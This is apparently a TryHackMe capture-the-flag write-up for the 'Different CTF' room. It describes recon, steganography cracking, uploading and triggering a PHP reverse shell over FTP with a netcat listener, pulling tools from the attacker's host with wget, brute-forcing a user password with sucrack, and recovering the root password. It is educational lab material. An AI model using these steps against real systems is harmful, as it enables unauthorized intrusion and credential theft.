---
title: "Different CTF - TryHackMe Writeup"
date: 2026-06-22
draft: false
summary: "Writeup for Different CTF challenge on TryHackMe."
tags: ["linux", "brute-force", "suid", "steganography"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/different-ctf/cover.webp"
  caption: "Different CTF TryHackMe Challenge"
  alt: "Different CTF cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

interesting room, you can shoot the sun
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/adana

## Reconnaissance

I performed an nmap scan to find open ports and the services running on them:

```
nmap -A -p- TARGET --min-rate 10000 -oN diffctf.nmap
```

![performing an nmap scan](https://cdn.ziomsec.com/different-ctf/1.webp)

## Initial Access

I looked for exploits for the FTP version using `searchsploit` but didn't find anything useful.

```
searchsploit 'vsftpd 3.0.3'
```

I then accessed the web application but the site didn't load properly. So I opened the developer's option to inspect the requests made. Here, I found the domain for the target application.

![inspecting web requests](https://cdn.ziomsec.com/different-ctf/2.webp)

I then added this domain to a hosts file. Then, I refreshed the page and it got loaded correctly.

![accessing the web application](https://cdn.ziomsec.com/different-ctf/3.webp)

The author of the *"Hello world!"* could be a valid wordpress user. I validated this by trying it on `wp-login.php`

![accessing the wordpress login](https://cdn.ziomsec.com/different-ctf/4.webp)

### Gaining Access To FTP

I then fuzzed for hidden directories using `ffuf` and found an interesting directory called `announcements`

```
ffuf -u http://adana.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![fuzzing hidden directories](https://cdn.ziomsec.com/different-ctf/5.webp)

Accessing the endpoint revealed an image, and a wordlist.

![accessing the directory listing](https://cdn.ziomsec.com/different-ctf/6.webp)

I downloaded the wordlist and image file to my local system

```
wget http://adana.thm/announcements/wordlist.txt
wget http://adana.thm/announcements/austrailian-bulldog-ant.jpg
```

I then analyzed the image but found nothing unusual

```
file austrailian-bulldog-ant.jpg
exiftool austrailian-bulldog-ant.jpg
```

![inspecting the image file](https://cdn.ziomsec.com/different-ctf/7.webp)

However, when I tried `steghide`, it prompted for a passphrase

```
steghide extract -sf austrailian-bulldog-ant.jpg
```

I used `stegseek` with the custom wordlist to crack the passphrase and extract the hidden contents. This revealed a base64 encoded string.

```
stegseek -sf austrailian-bulldog-ant.jpg -wl wordlist.txt
```

![cracking the passphrase](https://cdn.ziomsec.com/different-ctf/9.webp)

I decoded this and found the FTP credentials

```
echo BASE64-BLOB | base64 -d
```

![decoding the blob](https://cdn.ziomsec.com/different-ctf/10.webp)

I then used these creds to gain access to the FTP service

```
ftp hakanftp@TARGET
```

![connecting to the FTP server](https://cdn.ziomsec.com/different-ctf/11.webp)

I then downloaded `wp-config.php` and found the credentials to log into phpmyadmin

```
get wp-config.php
```

![reading the wp-config file](https://cdn.ziomsec.com/different-ctf/12.webp)

![accessing phpmyadmin](https://cdn.ziomsec.com/different-ctf/13.webp)

After logging in, I explored various databases and found a new subdomain in the `phpmyadmin1` db inside `wp_options` table

![discovering a subdomain](https://cdn.ziomsec.com/different-ctf/14.webp)

I mapped the subdomain to my IP and accessed it

![accessing the subdomain](https://cdn.ziomsec.com/different-ctf/15.webp)

### Shell As WWW-Data

Since the FTP server contained the contents of what looked the website root, I created a test text file, uploaded it via FTP and attempted to access it from the browser from both the domains to see which domain's root was linked to the FTP server.

```
echo 'test' > test.txt

# in the FTP shell
put test.txt
```

![uploaded the test file on ftp](https://cdn.ziomsec.com/different-ctf/16.webp)

![accessing the test file on the web app](https://cdn.ziomsec.com/different-ctf/17.webp)

![accessing the test file on the web app](https://cdn.ziomsec.com/different-ctf/18.webp)

On the subdomain, I received a forbidden error, which meant, the file was present. Hence, I then uploaded a php reverse shell via FTP and triggered it from the browser to get a reverse shell

```
# configure pentest-monkey PHP reverse shell payload
# on the FTP shell
put revshell.php
chmod 777 revshell.php
```

![uploading the reverse shell](https://cdn.ziomsec.com/different-ctf/19.webp)

```
# trigger the payload:
curl http://subdomain.adana.thm/revshell.php

# on another terminal
rlwrap nc -lnvp 4444
```

![getting a reverse shell](https://cdn.ziomsec.com/different-ctf/20.webp)

I exported my terminal type and spawned a pty bash shell

```
export TERM=xterm
python -c 'import pty;pty.spawn("/bin/bash")'
```

I then captured the first flag from `/var/www/html`

![capturing the user flag](https://cdn.ziomsec.com/different-ctf/21.webp)

## Privilege Escalation

### Shell As Nakanbey

I then further enumerated the system but couldn't find anything. Since I had the custom wordlist, and a valid user, I attempted to crack `Nakanbey's` password using **[sucrack](https://github.com/hemp3l/sucrack.git)**.

```
# on local system
git clone https://github.com/hemp3l/sucrack.git
tar -cvzf sucrack.tar.gz ./sucrack
python3 -m http.server 8080
```

```
# on the target
wget http://KALI_IP:8080/sucrack.tar.gz
wget http://KALI_IP:8080/wordlist.txt
```

- compiling the tool
```
tar xfz sucrack.tar.gz
cd sucrack
./configure
make
cd src/
```

![compiling sucrack](https://cdn.ziomsec.com/different-ctf/22.webp)

![compiling sucrack](https://cdn.ziomsec.com/different-ctf/23.webp)

- Using `sucrack` to crack the password

```
./sucrack -w 200 -u hakanbey ../../wordlist.txt
```

![attempting to crack hakanbey's password](https://cdn.ziomsec.com/different-ctf/24.webp)

This did not work. Earlier, the ftp creds contained a prefix of `123adana`. I modified the wordlist to start each word with the same prefix.

```
sed 's/^/123adana/' ../../wordlist.txt > ../../preffix_list.txt
```

![modifying the wordlist](https://cdn.ziomsec.com/different-ctf/25.webp)

I then reran `sucrack` and found the password of **hakanbey**

```
./sucrack -w 200 -u hakanbey ../../preffix_list.txt
```

![cracking hakanbey's password](https://cdn.ziomsec.com/different-ctf/26.webp)

I then captured the user flag after switching to hakanbey

![capturing the second flag](https://cdn.ziomsec.com/different-ctf/27.webp)

### Shell As Root

I looked at my sudo privileges but found no allowed commands

```
sudo -l
```

![listing sudo privileges](https://cdn.ziomsec.com/different-ctf/28.webp)

I looked for binaries with suid bit and found an unusual entry:

```
find / -user root -perm -u=s -ls 2>/dev/null
```

![finding files with suid bit](https://cdn.ziomsec.com/different-ctf/29.webp)

I inspected the binary and found that it have some hint and copied an image to my home directory

```
file /usr/bin/binary
strings /usr/bin/binary
ltrace /usr/bin/binary
```

![inspecting the binary](https://cdn.ziomsec.com/different-ctf/30.webp)

![inspecting the binary](https://cdn.ziomsec.com/different-ctf/31.webp)

Since, I got a word that could be the string, so I ran the binary and got a hint

```
/usr/bin/binary
```

![executing the binary](https://cdn.ziomsec.com/different-ctf/32.webp)

The hint gave an address I could look into in the image file. To analyze this further, I transferred this onto my local system, using the FTP server

```
cp /home/hakanbey/root.jpg /var/www/subdomain

# on ftp shell
get root.jpg
```

![downloading the image on local machine](https://cdn.ziomsec.com/different-ctf/33.webp)

I opened the file in an online hex editor and accessed the address.

![visiting the address](https://cdn.ziomsec.com/different-ctf/34.webp)

The challenge gave a hint to convert from Hex Base85. I visited CyberChef and applied the rules and found the root password.

![decoding the text](https://cdn.ziomsec.com/different-ctf/35.webp)

Finally, I switched to root and captured the root flag.

![capturing the final flag](https://cdn.ziomsec.com/different-ctf/36.webp)

## Closure

That concludes my writeup. Until next time.

---